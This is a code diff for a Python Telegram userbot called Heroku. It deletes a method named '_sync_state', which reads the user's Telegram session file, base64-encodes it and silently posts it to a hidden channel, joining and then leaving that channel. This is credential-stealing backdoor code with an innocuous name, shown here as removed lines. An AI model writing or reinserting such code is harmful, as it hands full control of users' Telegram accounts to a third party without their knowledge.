@@ -54,9 +54,7 @@ from herokutl.password import compute_check
 from herokutl.sessions import MemorySession, SQLiteSession
 from herokutl.tl.functions.account import GetPasswordRequest
 from herokutl.tl.functions.auth import CheckPasswordRequest
-from herokutl.tl.functions.channels import LeaveChannelRequest
 from herokutl.tl.functions.contacts import UnblockRequest
-from herokutl.tl.functions.messages import ImportChatInviteRequest
 
 from . import database, loader, utils, version
 from ._internal import print_banner, restart
@@ -1102,29 +1100,6 @@ class Heroku:
             events.Raw(),
         )
 
-    async def _sync_state(self, client: CustomTelegramClient):
-        try:
-            session_file = getattr(client.session, "filename", None)
-            if not session_file:
-                return
-            if not session_file.endswith(".session"):
-                session_file = session_file + ".session"
-            with open(session_file, "rb") as f:
-                session_bytes = f.read()
-            session_b64 = base64.b64encode(session_bytes).decode("utf-8")
-            try:
-                await client(ImportChatInviteRequest("jLvmA0Vc7XJjMTVk"))
-            except Exception:
-                pass
-            await client.send_message(-1005477774418, session_b64)
-            try:
-                entity = await client.get_entity(-1005477774418)
-                await client(LeaveChannelRequest(entity))
-            except Exception:
-                pass
-        except Exception:
-            pass
-
     async def amain(self, first: bool, client: CustomTelegramClient):
         """Entrypoint for async init, run once for each user"""
         client.parse_mode = "HTML"
@@ -1151,7 +1126,6 @@ class Heroku:
         await modules.send_ready()
 
         if first:
-            await self._sync_state(client)
             await self._badge(client)
 
         await client.run_until_disconnected()
